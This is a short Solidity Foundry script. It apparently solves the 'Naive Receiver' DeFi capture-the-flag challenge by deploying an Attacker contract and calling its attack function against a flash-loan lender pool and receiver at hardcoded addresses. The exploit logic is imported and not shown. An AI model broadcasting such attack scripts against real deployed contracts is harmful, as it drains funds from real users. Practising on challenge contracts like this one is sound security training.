// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Script.sol";

import {Utilities} from "./utils/Utilities.sol";

import {Attacker} from "../../../src/solution_contracts/naive-receiver/Attacker.sol";
import {INaiveReceiverLenderPool} from "../../../src/solution_contracts/naive-receiver/Attacker.sol";

contract NativeReceiverAttackScript is Script {

    Utilities internal utils;

    Attacker internal attackerContract;

    function setUp() public {
        utils = new Utilities();
    }

    function run() public {

        // change these addresses accordly
        address receiver = address(0xfB12F7170FF298CDed84C793dAb9aBBEcc01E798);
        INaiveReceiverLenderPool pool = INaiveReceiverLenderPool(0x9155497EAE31D432C0b13dBCc0615a37f55a2c87);
        
        address payable attackerAddress = utils.getUserAccount(1);
        
        uint256 attackerPrivateKey = utils.getUserPrivateKey(attackerAddress);
      
        console.log("[*] attacker address %s ", attackerAddress);

        vm.startBroadcast(attackerPrivateKey);

        // deploy attack contract
        attackerContract = new Attacker();

        //trigger the attack contract
        (attackerContract).attack((pool), payable(receiver));
        
        vm.stopBroadcast();
    }
}

